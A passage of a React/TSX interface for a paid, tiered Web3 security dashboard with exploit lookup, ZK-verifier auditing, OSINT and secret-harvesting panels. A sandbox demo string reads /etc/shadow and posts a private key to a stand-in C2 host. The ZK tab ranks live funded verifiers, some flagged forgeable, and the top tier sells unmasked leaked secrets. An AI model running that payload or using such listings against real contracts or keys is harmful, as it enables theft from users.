        <div className="flex items-center justify-between gap-3 rounded-xl border border-primary/50 bg-primary/10 px-4 py-2.5 font-mono text-xs text-primary">
          <span>
            📂 {isRu ? "Открыт сохранённый отчёт из истории:" : "Loaded saved report from history:"}{" "}
            <b className="text-foreground">{openedHistoryBanner}</b>
          </span>
          <button
            type="button"
            onClick={() => setOpenedHistoryBanner(null)}
            className="text-muted-foreground hover:text-foreground"
          >
            ✕
          </button>
        </div>
      )}
      {/* Tool selector */}
      <div className="flex flex-wrap gap-2">
        {TOOLS.map((t) => {
          const Icon = t.icon;
          const isLocked = rank < t.minRank;
          return (
            <button
              key={t.id}
              onClick={() => {
                setTool(t.id);
                setResult(null);
                setError(null);
                setInput1("");
                setInput2("");
              }}
              className={`inline-flex items-center gap-2 rounded-xl px-3.5 py-2.5 font-mono text-xs font-semibold transition-all ${
                tool === t.id
                  ? "bg-primary text-primary-foreground shadow"
                  : "border border-border bg-card text-muted-foreground hover:text-foreground"
              }`}
            >
              <Icon size={14} />
              <span>{isRu ? t.labelRu : t.labelEn}</span>
              {isLocked && <Lock size={11} className="opacity-70" />}
            </button>
          );
        })}
      </div>

      {/* Input form */}
      {locked ? (
        <div className="rounded-xl border border-primary/35 bg-card p-8 text-center bg-radial-red">
          <div className="mx-auto mb-3 flex h-12 w-12 items-center justify-center rounded-2xl border border-primary/40 bg-primary/15 text-primary">
            <Lock size={22} />
          </div>
          <span className="rounded-full border border-primary/40 bg-primary/15 px-3 py-1 font-mono text-[10px] font-bold uppercase tracking-widest text-primary">
            {active.minRank === 2 ? "RAW / BLACKBOX REQUIRED" : "RADAR+ REQUIRED"}
          </span>
          <p className="mx-auto mt-3 max-w-md font-mono text-xs text-muted-foreground">
            {isRu
              ? `Инструмент «${active.labelRu}» доступен начиная с тарифа ${active.minRank === 2 ? "RAW" : "RADAR"}.`
              : `"${active.labelEn}" requires ${active.minRank === 2 ? "RAW" : "RADAR"} tier or higher.`}
          </p>
        </div>
      ) : (
        <div className="rounded-xl border border-border bg-card p-5 space-y-3">
          {tool === "sandbox" ? (
            <div className="space-y-3">
              <div className="flex flex-wrap items-center justify-between gap-2 font-mono text-xs">
                <span className="text-muted-foreground">
                  {isRu
                    ? "Вставьте подозрительный Python / Web3 скрипт или PoC-эксплойт (вызовы requests/subprocess/os/socket/web3 перехватываются до исполнения):"
                    : "Paste untrusted Python / Web3 script or PoC (requests/subprocess/os/socket/web3 calls are intercepted pre-execution):"}
                </span>
                <button
                  type="button"
                  onClick={() =>
                    setInput1(
                      `import requests, subprocess\n# Matrix Sandbox v16.2 Demo: secret file read + C2 exfil + shell spawn\ntry:\n    open("/etc/shadow").read()\nexcept Exception as e:\n    print("Blocked secret file:", e)\nrequests.post("https://c2-collector.example/drop", json={"pk": "0xdeadbeef"})\nsubprocess.run(["id"])\nprint("Sandbox execution finished")`
                    )
                  }
                  className="rounded-lg border border-primary/40 bg-primary/10 px-2.5 py-1 text-[11px] font-semibold text-primary hover:bg-primary hover:text-primary-foreground"
                >
                  {isRu ? "⚡ Вставить демо-тест Matrix v16.2" : "⚡ Load Matrix v16.2 Demo"}
                </button>
              </div>
              <textarea
                rows={6}
                value={input1}
                onChange={(e) => setInput1(e.target.value)}
                placeholder={active.placeholder}
                className="w-full rounded-xl border border-border bg-background p-3.5 font-mono text-xs text-foreground outline-none focus:border-primary"
              />
              <div className="flex justify-end">
                <button
                  onClick={run}
                  disabled={loading || !input1.trim()}
                  className="inline-flex items-center justify-center gap-2 rounded-xl bg-primary px-5 py-2.5 font-mono text-xs font-semibold text-primary-foreground transition-all hover:bg-primary-dim disabled:opacity-40 btn-glow"
                >
                  {loading ? <Loader2 size={14} className="animate-spin" /> : <Terminal size={14} />}
                  <span>{loading ? (isRu ? "Изоляция v16.2…" : "Isolating v16.2…") : isRu ? "Запустить в Matrix Sandbox v16.2" : "Run in Matrix Sandbox v16.2"}</span>
                </button>
              </div>
            </div>
          ) : (
            <div className="grid grid-cols-1 gap-3 sm:grid-cols-4">
              <input
                ref={tool === "ospec" ? ospecSearchInputRef : undefined}
                value={input1}
                onChange={(e) => setInput1(e.target.value)}
                onKeyDown={(e) => e.key === "Enter" && (tool === "ospec" || tool === "hacks" || input1) && run()}
                placeholder={active.placeholder}
                className="rounded-xl border border-border bg-background px-4 py-3 font-mono text-xs text-foreground outline-none focus:border-primary sm:col-span-2"
              />
              {(tool === "holders" || tool === "funds" || tool === "zk" || tool === "hacks" || tool === "proxy" || tool === "flash" || tool === "deployer") ? (
                <select
                  value={chain}
                  onChange={(e) => setChain(e.target.value)}
                  className="rounded-xl border border-border bg-background px-3 py-3 font-mono text-xs text-foreground outline-none focus:border-primary"
                >
                  {["ethereum", "bsc", "polygon", "arbitrum", "base", "optimism"].map((c) => (
                    <option key={c} value={c}>
                      {c.toUpperCase()}
                    </option>
                  ))}
                </select>
              ) : (
                <div className="flex items-center rounded-xl border border-border bg-background/60 px-4 py-3 font-mono text-xs text-muted-foreground">
                  {tool === "market"
                    ? isRu ? "Тикер монеты" : "Coin ticker"
                    : tool === "social"
                    ? "X / TG / Discord / GitHub"
                    : tool === "soroban"
                    ? "Stellar / Soroban SIM"
                    : tool === "drift"
                    ? isRu ? "Папки audits/ + Git Drift" : "audits/ PDFs + Git Drift"
                    : tool === "surface"
                    ? "Subdomains + JS Bundles"
                    : "OSPEC Harvester DB (RADAR+)"}
                </div>
              )}
              <button
                onClick={run}
                disabled={loading || (tool !== "ospec" && tool !== "hacks" && !(tool === "market" && marketMode === "trending") && !input1)}
                className="inline-flex items-center justify-center gap-2 rounded-xl bg-primary px-4 py-3 font-mono text-xs font-semibold text-primary-foreground transition-all hover:bg-primary-dim disabled:opacity-40 btn-glow"
              >
                {loading ? <Loader2 size={14} className="animate-spin" /> : <Search size={14} />}
                <span>{loading ? (isRu ? "Считаю…" : "Running…") : isRu ? "Запустить" : "Run"}</span>
              </button>
            </div>
          )}

          {/* Quick presets for Holders & Whales */}
          {tool === "holders" && (
            <div className="flex flex-wrap items-center gap-2 pt-1 font-mono text-[11px]">
              <span className="text-muted-foreground">{isRu ? "Быстрые токены:" : "Quick tokens:"}</span>
              {[
                { label: "USDT (Ethereum)", val: "0xdAC17F958D2ee523a2206206994597C13D831ec7" },
                { label: "USDC (Ethereum)", val: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48" },
                { label: "AAVE Token", val: "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9" },
                { label: "Lido stETH", val: "0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84" },
                { label: "DeXe (DEXE)", val: "0xde4EE8057785A7e8e800Db58F9784845A5C2cbd6" },
              ].map((p) => (
                <button
                  key={p.val}
                  type="button"
                  onClick={() => setInput1(p.val)}
                  className="rounded-lg border border-border bg-background px-2.5 py-1 text-muted-foreground hover:border-primary hover:text-primary"
                >
                  {p.label}
                </button>
              ))}
            </div>
          )}

          {/* Mode Switcher (Single Token vs Trending Scanner) + Quick presets for Market & Derivatives */}
          {tool === "market" && (
            <div className="space-y-2.5 pt-1 font-mono text-[11px]">
              <div className="flex flex-wrap items-center justify-between gap-2 border-t border-border/60 pt-2.5">
                <div className="flex flex-wrap items-center gap-2">
                  <span className="text-muted-foreground">{isRu ? "Режим Market Engine:" : "Market Engine Mode:"}</span>
                  <button
                    type="button"
                    onClick={() => {
                      setMarketMode("single");
                      setSelectedTrendingDossier(null);
                    }}
                    className={`rounded-lg border px-3 py-1 font-semibold transition-all ${
                      marketMode === "single"
                        ? "border-primary bg-primary/15 text-primary"
                        : "border-border bg-background text-muted-foreground hover:text-foreground"
                    }`}
                  >
                    🔍 {isRu ? "Скан тикера (Single Token)" : "Single Token Scan"}
                  </button>
                  <button
                    type="button"
                    onClick={() => {
                      if (rank < 2) {
                        setError(
                          isRu
                            ? "🔥 Трендовый сканер (Поиск по трендам CoinGecko) доступен на тарифах RAW и BLACKBOX (как и в Telegram-боте)."
                            : "🔥 Trending Scanner (CoinGecko Trend Search) requires RAW or BLACKBOX tier."
                        );
                        return;
                      }
                      setMarketMode("trending");
                      runTrendingScan(trendingCount);
                    }}
                    disabled={loading}
                    className={`rounded-lg border px-3 py-1 font-semibold transition-all ${
                      marketMode === "trending"
                        ? "border-primary bg-primary text-primary-foreground shadow"
                        : "border-primary/40 bg-primary/10 text-primary hover:bg-primary hover:text-primary-foreground"
                    }`}
                  >
                    🔥 {isRu ? "Трендовый сканер (CoinGecko Trending)" : "Trending Scanner (CoinGecko)"}
                  </button>
                </div>

                <div className="flex flex-wrap items-center gap-1.5">
                  <span className="text-muted-foreground">{isRu ? "Монет в тренде:" : "Trending batch:"}</span>
                  {[
                    { cnt: 5, label: "Quick (5)" },
                    { cnt: 10, label: "Normal (10)" },
                    { cnt: 15, label: "Full (15)" },
                  ].map((b) => (
                    <button
                      key={b.cnt}
                      type="button"
                      disabled={loading}
                      onClick={() => {
                        if (rank < 2) {
                          setError(
                            isRu
                              ? "🔥 Трендовый сканер (5 / 10 / 15 монет) доступен на тарифах RAW и BLACKBOX."
                              : "🔥 Trending Scanner requires RAW or BLACKBOX tier."
                          );
                          return;
                        }
                        setTrendingCount(b.cnt);
                        setMarketMode("trending");
                        runTrendingScan(b.cnt);
                      }}
                      className={`rounded-lg border px-2.5 py-1 font-semibold transition-all ${
                        marketMode === "trending" && trendingCount === b.cnt
                          ? "border-primary bg-primary/20 text-primary"
                          : "border-border bg-background text-muted-foreground hover:border-primary hover:text-primary"
                      }`}
                    >
                      {b.label}
                    </button>
                  ))}
                </div>
              </div>

              <div className="flex flex-wrap items-center gap-2">
                <span className="text-muted-foreground">{isRu ? "Быстрые тикеры:" : "Quick tickers:"}</span>
                {["DOGE", "BTC", "ETH", "SOL", "AAVE", "PEPE", "ENA", "ARB"].map((sym) => (
                  <button
                    key={sym}
                    type="button"
                    onClick={() => {
                      setMarketMode("single");
                      setInput1(sym);
                    }}
                    className="rounded-lg border border-border bg-background px-2.5 py-1 text-muted-foreground hover:border-primary hover:text-primary"
                  >
                    ${sym}
                  </button>
                ))}
              </div>
            </div>
          )}

          {/* Mode & Days selector + Quick presets for Funds Flow */}
          {tool === "funds" && (
            <div className="flex flex-wrap items-center justify-between gap-2 pt-1 font-mono text-[11px]">
              <div className="flex flex-wrap items-center gap-1.5">
                <span className="text-muted-foreground">{isRu ? "Режим цели:" : "Target Mode:"}</span>
                {[
                  { id: "auto", label: isRu ? "⚡ Авто" : "⚡ Auto", minR: 1 },
                  { id: "address", label: isRu ? "📜 Контракт / Кошелёк [RADAR+]" : "📜 Contract / EOA [RADAR+]", minR: 1 },
                  { id: "pool", label: isRu ? "💧 LP Pool [RAW+]" : "💧 LP Pool [RAW+]", minR: 2 },
                  { id: "multichain", label: isRu ? "🌐 Мультичейн [BLACKBOX]" : "🌐 Multichain [BLACKBOX]", minR: 3 },
                ].map((m) => (
                  <button
                    key={m.id}
                    type="button"
                    onClick={() => {
                      if (rank < m.minR) {
                        setError(
                          isRu
                            ? `Режим «${m.label}» доступен начиная с тарифа ${m.minR === 3 ? "BLACKBOX" : "RAW"}.`
                            : `Mode "${m.label}" requires ${m.minR === 3 ? "BLACKBOX" : "RAW"} tier.`
                        );
                        return;
                      }
                      setError(null);
                      setFundsMode(m.id as any);
                    }}
                    className={`rounded-lg border px-2.5 py-1 font-semibold transition-all ${
                      fundsMode === m.id
                        ? "border-primary bg-primary/15 text-primary"
                        : "border-border bg-background text-muted-foreground hover:text-foreground"
                    }`}
                  >
                    {m.label}
                  </button>
                ))}
                <span className="ml-2 text-muted-foreground">{isRu ? "Период:" : "Window:"}</span>
                {[7, 14, 30].map((d) => (
                  <button
                    key={d}
                    type="button"
                    onClick={() => setFundsDays(d)}
                    className={`rounded-lg border px-2 py-1 font-semibold ${
                      fundsDays === d
                        ? "border-primary bg-primary/15 text-primary"
                        : "border-border bg-background text-muted-foreground hover:text-foreground"
                    }`}
                  >
                    {d}d
                  </button>
                ))}
              </div>
              <div className="flex flex-wrap items-center gap-1.5">
                {[
                  { label: "USDC Contract", val: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48" },
                  { label: "Aave V3 Pool", val: "0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2" },
                  { label: "Curve 3Pool", val: "0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7" },
                ].map((p) => (
                  <button
                    key={p.val}
                    type="button"
                    onClick={() => setInput1(p.val)}
                    className="rounded-lg border border-border bg-background px-2.5 py-1 text-muted-foreground hover:border-primary hover:text-primary"
                  >
                    {p.label}
                  </button>
                ))}
              </div>
            </div>
          )}

          {/* Quick presets for Web3 Surface Mapper */}
          {tool === "surface" && (
            <div className="flex flex-wrap items-center gap-2 pt-1 font-mono text-[11px]">
              <span className="text-muted-foreground">{isRu ? "Быстрые домены протоколов:" : "Quick protocol domains:"}</span>
              {["aave.com", "dexe.network", "across.to", "lido.fi", "curve.fi"].map((dom) => (
                <button
                  key={dom}
                  type="button"
                  onClick={() => setInput1(dom)}
                  className="rounded-lg border border-border bg-background px-2.5 py-1 text-muted-foreground hover:border-primary hover:text-primary"
                >
                  {dom}
                </button>
              ))}
            </div>
          )}

          {/* Quick presets for 2,539 Exploits DB (1,678 Deep Writeups + 861 DeFiHackLabs) */}
          {tool === "hacks" && (
            <div className="flex flex-wrap items-center gap-2 pt-1 font-mono text-[11px]">
              <span className="text-muted-foreground">
                {isRu ? "Быстрый поиск по 1,678 разборам или 0x-контракту:" : "Quick search across 1,678 writeups or 0x contract:"}
              </span>
              {[
                { label: "Uranium ($50M K-Check)", val: "uranium" },
                { label: "Euler Finance", val: "euler" },
                { label: "Curve / Vyper Reentrancy", val: "curve" },
                { label: "TWAP / Spot Oracle", val: "slot0" },
                { label: "Cross-Chain Bridges", val: "vuln/bridge" },
                { label: "0x8787...A4E2 (Aave V3 Pool)", val: "0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2" },
              ].map((p) => (
                <button
                  key={p.val}
                  type="button"
                  onClick={() => setInput1(p.val)}
                  className="rounded-lg border border-border bg-background px-2.5 py-1 text-muted-foreground hover:border-primary hover:text-primary"
                >
                  {p.label}
                </button>
              ))}
            </div>
          )}

          {/* Quick presets for Audit Drift (GitHub repos with audits/ folders) */}
          {tool === "drift" && (
            <div className="flex flex-wrap items-center gap-2 pt-1 font-mono text-[11px]">
              <span className="text-muted-foreground">{isRu ? "Быстрые репо с аудитами:" : "Quick audited repos:"}</span>
              {[
                "https://github.com/aave/aave-v3-core",
                "https://github.com/OpenZeppelin/openzeppelin-contracts",
                "https://github.com/curvefi/curve-stablecoin",
              ].map((preset) => (
                <button
                  key={preset}
                  type="button"
                  onClick={() => setInput1(preset)}
                  className="rounded-lg border border-border bg-background px-2.5 py-1 text-muted-foreground hover:border-primary hover:text-primary"
                >
                  {preset.replace("https://github.com/", "")}
                </button>
              ))}
            </div>
          )}

          {/* Quick presets for Social & OSINT */}
          {tool === "social" && (
            <div className="flex flex-wrap items-center gap-2 pt-1 font-mono text-[11px]">
              <span className="text-muted-foreground">{isRu ? "Быстрые цели OSINT:" : "Quick OSINT targets:"}</span>
              {[
                { label: "Aave (aave.com)", val: "aave.com" },
                { label: "Uniswap (uniswap.org)", val: "uniswap.org" },
                { label: "Lido (lido.fi)", val: "lido.fi" },
                { label: "DeXe (dexe.network)", val: "dexe.network" },
                { label: "Curve (curve.fi)", val: "curve.fi" },
                { label: "Pendle (pendle.finance)", val: "pendle.finance" },
              ].map((p) => (
                <button
                  key={p.val}
                  type="button"
                  onClick={() => setInput1(p.val)}
                  className="rounded-lg border border-border bg-background px-2.5 py-1 text-muted-foreground hover:border-primary hover:text-primary"
                >
                  {p.label}
                </button>
              ))}
            </div>
          )}

          {/* Quick presets for Proxy & EIP-1967 */}
          {tool === "proxy" && (
            <div className="flex flex-wrap items-center gap-2 pt-1 font-mono text-[11px]">
              <span className="text-muted-foreground">{isRu ? "Быстрые прокси-контракты:" : "Quick proxy contracts:"}</span>
              {[
                { label: "USDC FiatTokenProxy", val: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", ch: "ethereum" },
                { label: "Aave V3 Pool Proxy", val: "0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2", ch: "ethereum" },
                { label: "Lido stETH Proxy", val: "0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84", ch: "ethereum" },
                { label: "EigenLayer StrategyManager", val: "0x858646372CC42E1A627fcE94aa7A7033e7CF075A", ch: "ethereum" },
              ].map((p) => (
                <button
                  key={p.val}
                  type="button"
                  onClick={() => {
                    setInput1(p.val);
                    setChain(p.ch);
                  }}
                  className="rounded-lg border border-border bg-background px-2.5 py-1 text-muted-foreground hover:border-primary hover:text-primary"
                >
                  {p.label}
                </button>
              ))}
            </div>
          )}

          {/* Quick presets for Flash-Loan & Spot-Oracle */}
          {tool === "flash" && (
            <div className="flex flex-wrap items-center gap-2 pt-1 font-mono text-[11px]">
              <span className="text-muted-foreground">{isRu ? "Быстрые контракты оракулов/пулов:" : "Quick oracle/pool targets:"}</span>
              {[
                { label: "Aave V3 Pool (FlashLoan)", val: "0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2", ch: "ethereum" },
                { label: "Uniswap V3 USDC/WETH", val: "0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640", ch: "ethereum" },
                { label: "Curve 3Pool", val: "0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7", ch: "ethereum" },
              ].map((p) => (
                <button
                  key={p.val}
                  type="button"
                  onClick={() => {
                    setInput1(p.val);
                    setChain(p.ch);
                  }}
                  className="rounded-lg border border-border bg-background px-2.5 py-1 text-muted-foreground hover:border-primary hover:text-primary"
                >
                  {p.label}
                </button>
              ))}
            </div>
          )}

          {/* Quick presets for Deployer & Address Profiler */}
          {tool === "deployer" && (
            <div className="flex flex-wrap items-center gap-2 pt-1 font-mono text-[11px]">
              <span className="text-muted-foreground">{isRu ? "Быстрые цели деплоера:" : "Quick deployer targets:"}</span>
              {[
                { label: "Tornado Cash 100 ETH Pool", val: "0xA160cdAB225685dA1d56aa342Ad8841c3b53f291", ch: "ethereum" },
                { label: "Aave V3 Pool", val: "0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2", ch: "ethereum" },
                { label: "USDT Tether Contract", val: "0xdAC17F958D2ee523a2206206994597C13D831ec7", ch: "ethereum" },
              ].map((p) => (
                <button
                  key={p.val}
                  type="button"
                  onClick={() => {
                    setInput1(p.val);
                    setChain(p.ch);
                  }}
                  className="rounded-lg border border-border bg-background px-2.5 py-1 text-muted-foreground hover:border-primary hover:text-primary"
                >
                  {p.label}
                </button>
              ))}
            </div>
          )}

          {/* Quick presets for Stellar / Soroban */}
          {tool === "soroban" && (
            <div className="flex flex-wrap items-center gap-2 pt-1 font-mono text-[11px]">
              <span className="text-muted-foreground">{isRu ? "Быстрые активы Stellar / Soroban:" : "Quick Stellar / Soroban assets:"}</span>
              {["USDC", "AQUA", "YXLM", "EURC", "XLM"].map((tk) => (
                <button
                  key={tk}
                  type="button"
                  onClick={() => setInput1(tk)}
                  className="rounded-lg border border-border bg-background px-2.5 py-1 text-muted-foreground hover:border-primary hover:text-primary"
                >
                  {tk}
                </button>
              ))}
            </div>
          )}

          {/* Quick-Launch Mathematical Showcase & Active Funded/Controlling Filter for ZK Math Monster v5.5 */}
          {tool === "zk" && (
            <div className="space-y-3 rounded-xl border border-primary/35 bg-background/70 p-3.5 font-mono text-[11px]">
              <div className="flex flex-wrap items-center justify-between gap-2 border-b border-border/60 pb-2.5">
                <div className="flex flex-wrap items-center gap-1.5">
                  <button
                    type="button"
                    onClick={() => setZkShowcaseTab("active_tvl")}
                    className={`rounded-lg border px-3 py-1.5 font-bold transition-all ${
                      zkShowcaseTab === "active_tvl"
                        ? "border-green-500 bg-green-500/20 text-green-300 shadow-sm"
                        : "border-border bg-card text-muted-foreground hover:text-foreground"
                    }`}
                  >
                    💰 {isRu ? "Живые с балансом (TVL $), Nonce > 0 и Управляющие/Делегации (Без пустышек!)" : "Active Funded (TVL $), Nonce > 0 & Controlling/Delegated (No Empty Shells!)"}
                  </button>
                  <button
                    type="button"
                    onClick={() => setZkShowcaseTab("benchmarks")}
                    className={`rounded-lg border px-3 py-1.5 font-bold transition-all ${
                      zkShowcaseTab === "benchmarks"
                        ? "border-primary bg-primary text-primary-foreground shadow-sm"
                        : "border-border bg-card text-muted-foreground hover:text-foreground"
                    }`}
                  >
                    📐 {isRu ? "Канонические эталоны по 7 системам (Взломы vs Sound)" : "Canonical Benchmarks (7 Proving Systems)"}
                  </button>
                </div>
                <span className="text-[10px] text-muted-foreground">
                  {isRu ? "88+ пулов с балансом (~$969.5M TVL) · 738 активных с Nonce > 0 · 65 детекторов" : "88+ funded pools (~$969.5M TVL) · 738 active with Nonce > 0 · 65 detectors"}
                </span>
              </div>

              {zkShowcaseTab === "active_tvl" ? (
                <div className="space-y-2">
                  <p className="text-[10px] text-muted-foreground">
                    {isRu
                      ? "⚡ В эту вкладку автоматически отфильтрованы только ЖИВЫЕ контракты (где есть реальные деньги TVL > $0 на контракте или управляющем пуле, активный Nonce/транзакции или делегирование verifyProof). Пустые изолированные верификаторы скрыты:"
                      : "⚡ Filtered strictly to LIVE contracts with real TVL ($ > 0), active Nonce/Txs, or controlling pool delegation (stateless empty shells excluded):"}
                  </p>
                  {zkActiveLoading ? (
                    <div className="flex items-center gap-2 py-2 text-muted-foreground">
                      <Loader2 size={13} className="animate-spin text-primary" />
                      <span>{isRu ? "Загрузка живых контрактов с балансом и Nonce…" : "Loading active funded & controlling ZK contracts…"}</span>
                    </div>
                  ) : (
                    <div className="grid grid-cols-1 gap-2 sm:grid-cols-2 lg:grid-cols-3 max-h-64 overflow-y-auto pr-1">
                      {zkActiveContracts.map((ac: any) => {
                        const tvl = Number(ac.effective_tvl_usd || ac.tvl_usd || 0);
                        const txs = Number(ac.effective_tx_count || ac.normal_tx_count || 0);
                        const isCrit = String(ac.risk_level || "").toUpperCase() === "CRITICAL";
                        return (
                          <button
                            key={`${ac.chain}:${ac.address}`}
                            type="button"
                            onClick={async () => {
                              setInput1(ac.address);
                              setChain(ac.chain);
                              setError(null);
                              setLoading(true);
                              try {
                                const res = await fetch(`${API_BASE}/api/tools/zk-audit`, {
                                  method: "POST",
                                  headers: { "Content-Type": "application/json", ...authHeaders() },
                                  body: JSON.stringify({ address: ac.address, chain: ac.chain }),
                                });
                                const data = await res.json().catch(() => ({}));
                                if (!res.ok) throw new Error(data.detail || `HTTP ${res.status}`);
                                setResult(data);
                                loadHistory("zk");
                              } catch (e: any) {
                                setError(e.message || "ZK Audit error");
                              } finally {
                                setLoading(false);
                              }
                            }}
                            className={`flex flex-col justify-between rounded-lg border p-2.5 text-left transition-all ${
                              input1.toLowerCase() === String(ac.address).toLowerCase()
                                ? "border-primary bg-primary/15"
                                : isCrit
                                ? "border-red-500/40 bg-red-500/5 hover:border-red-500"
                                : "border-border bg-card hover:border-primary/50"
                            }`}
                          >
                            <div className="flex items-center justify-between gap-1.5">
                              <span className="truncate font-bold text-foreground text-[11px]">
                                {ac.display_name || ac.protocol_name || ac.mc_name || ac.contract_name || `${ac.proving_system} Verifier`}
                              </span>
                              <span className="rounded bg-background border border-border px-1.5 py-0.5 text-[9px] uppercase text-primary shrink-0">
                                {ac.chain} · {ac.proving_system}
                              </span>
                            </div>
                            <div className="mt-1.5 flex flex-wrap items-center gap-1.5 text-[10px]">
                              {tvl > 0 && (
                                <span className="rounded border border-green-500/50 bg-green-500/15 px-1.5 py-0.5 font-bold text-green-300">
                                  💰 TVL: ${tvl >= 1e6 ? (tvl / 1e6).toFixed(2) + "M" : tvl.toLocaleString()}
                                </span>
                              )}
                              {txs > 0 && (
                                <span className="rounded border border-cyan-500/40 bg-cyan-500/10 px-1.5 py-0.5 text-cyan-300">
                                  ⚡ Nonce/Tx: {txs}
                                </span>
                              )}
                              {ac.last_caller && (
                                <span className="rounded border border-purple-500/40 bg-purple-500/10 px-1.5 py-0.5 text-purple-300">
                                  🏛️ Pool: {String(ac.last_caller).slice(0, 8)}…
                                </span>
                              )}
                              <span className={`rounded px-1.5 py-0.5 font-bold ${isCrit ? "bg-red-500/20 text-red-300" : "bg-amber-500/15 text-amber-300"}`}>
                                {ac.risk_level}
                              </span>
                            </div>
                            <p className="mt-1 truncate text-[10px] text-muted-foreground">{ac.address}</p>
                          </button>
                        );
                      })}
                    </div>
                  )}
                </div>
              ) : (
                <div className="flex flex-wrap items-center gap-1.5">
                  {[
                    { label: "🔴 FoomCash Groth16 (EXPLOITED γ==δ==G₂)", addr: "0xc043865fb4D542E2bc5ed5Ed9A2F0939965671A6", ch: "ethereum" },
                    { label: "🔴 Polygon Groth16 γ == δ Forgery", addr: "0xa6e4e74dbd04cc08bf054dd1aa5b9f83b5e66e2d", ch: "polygon" },
                    { label: "🟢 Tornado Core Verifier (SOUND MPC)", addr: "0xce172ce1f20ec0b3728c9965470eaf994a03557a", ch: "ethereum" },
                    { label: "🟢 Tornado 100 ETH Pool ($969M TVL → Auto-Follows Verifier)", addr: "0xA160cdAB225685dA1d56aa342Ad8841c3b53f291", ch: "ethereum" },
                    { label: "🟣 Polygon zkEVM FFLONK (SOUND 23KB)", addr: "0xf2f73b87e97730dca6558dd71c0b1c945ca38096", ch: "ethereum" },
                    { label: "🧬 Canonical PLONK KZG (SOUND 24KB)", addr: "0x1c397f0c436cff6159f10fbccd38374ec79e6902", ch: "ethereum" },
                    { label: "🔮 Aztec / Noir Honk (SOUND 24.5KB)", addr: "0x6e9bf73099cdc6d91d81d246238c5be5893cd6ff", ch: "ethereum" },
                    { label: "🔵 Halo2 SHPLONK/GWC (14KB)", addr: "0x9b4f52e82f744f371f59f8904aee5d83bdcf81a5", ch: "ethereum" },
                    { label: "🟡 STARK / FRI Transparent (19KB)", addr: "0xd4d6d145d26e948e7f7b98b06a742d1aed34e1cf", ch: "ethereum" },
                    { label: "⚡ zkVM Receipt (SP1 / RISC Zero)", addr: "0x16613999219f9b56bededbf3722e44c4c2045300", ch: "ethereum" },
                  ].map((zp) => (
                    <button
                      key={`${zp.ch}:${zp.addr}`}
                      type="button"
                      onClick={async () => {
                        setInput1(zp.addr);
                        setChain(zp.ch);
                        setError(null);
                        setLoading(true);
                        try {
                          const res = await fetch(`${API_BASE}/api/tools/zk-audit`, {
                            method: "POST",
                            headers: { "Content-Type": "application/json", ...authHeaders() },
                            body: JSON.stringify({ address: zp.addr, chain: zp.ch }),
                          });
                          const data = await res.json().catch(() => ({}));
                          if (!res.ok) throw new Error(data.detail || `HTTP ${res.status}`);
                          setResult(data);
                          loadHistory("zk");
                        } catch (e: any) {
                          setError(e.message || "ZK Audit error");
                        } finally {
                          setLoading(false);
                        }
                      }}
                      className={`rounded-lg border px-2.5 py-1 font-semibold transition-all ${
                        input1.toLowerCase() === zp.addr.toLowerCase()
                          ? "border-primary bg-primary text-primary-foreground shadow-sm"
                          : "border-border bg-card text-muted-foreground hover:border-primary/50 hover:text-foreground"
                      }`}
                    >
                      {zp.label}
                    </button>
                  ))}
                </div>
              )}
            </div>
          )}

          {/* Structured OSPEC Intelligence Deck: 3-Tier Gating + 7 Secret Families + Dropdowns + Hotkeys */}
          {tool === "ospec" && (
            <div className="space-y-3 pt-1.5">
              {/* Top Tier Access & Keyboard Hotkeys Bar */}
              <div className="flex flex-wrap items-center justify-between gap-2 rounded-xl border border-border/80 bg-background/70 px-3 py-2 font-mono text-[10px]">
                <div className="flex flex-wrap items-center gap-2">
                  <span
                    className={`rounded-md border px-2 py-0.5 font-bold uppercase ${
                      rank >= 3
                        ? "border-amber-500/60 bg-amber-500/15 text-amber-300"
                        : rank === 2
                        ? "border-cyan-500/60 bg-cyan-500/15 text-cyan-300"
                        : "border-primary/50 bg-primary/15 text-primary"
                    }`}
                  >
                    {rank >= 3
                      ? "🥇 BLACKBOX: FULL ACCESS (246 СИГНАТУР)"
                      : rank === 2
                      ? "🥈 RAW: СЕРЕДИНКА (ПУТИ + МАСКА + LIVE)"
                      : "🥉 RADAR: БАЗОВЫЙ ОБЗОР (ОГРАНИЧЕННО)"}
                  </span>
                  <span className="text-muted-foreground">
                    {rank >= 3
                      ? isRu
                        ? "Открыты полные нецензурированные секреты, Whitehat-пулы (POS/Рестораны/SaaS), обратный отсев TEST/SUSPECT и управление демонами"
                        : "Full unmasked secrets, Whitehat POS/SaaS pools, TEST/SUSPECT reverse-sieve, and daemon controls unlocked"
                      : rank === 2
                      ? isRu
                        ? "Открыты файл:строка, маска секрета и LIVE-фильтр. Полные нецензурированные ключи и обратный отсев — на BLACKBOX."
                        : "File:line, masked preview & LIVE filter unlocked. Unmasked secrets & reverse-sieve require BLACKBOX."
                      : isRu
                      ? "Лимит 10 групп, пути и секреты скрыты. На RAW — пути + маска + LIVE, на BLACKBOX — полные нецензурированные ключи."
                      : "Limited to 10 groups, paths & secrets hidden. Upgrade to RAW for paths/LIVE or BLACKBOX for full unmasked keys."}
                  </span>
                </div>
                <div className="flex flex-wrap items-center gap-1 text-[9px] text-muted-foreground">
                  <span className="font-semibold text-foreground">{isRu ? "⌨️ Хоткеи:" : "⌨️ Hotkeys:"}</span>
                  <kbd className="rounded border border-border bg-card px-1 py-0.5 text-foreground">/</kbd>
                  <span>{isRu ? "поиск" : "search"}</span>
                  <kbd className="rounded border border-border bg-card px-1 py-0.5 text-foreground">1</kbd>
                  <span>REAL</span>
                  <kbd className="rounded border border-border bg-card px-1 py-0.5 text-foreground">2</kbd>
                  <span>LIVE</span>
                  <kbd className="rounded border border-border bg-card px-1 py-0.5 text-foreground">3</kbd>
                  <span>Crit</span>
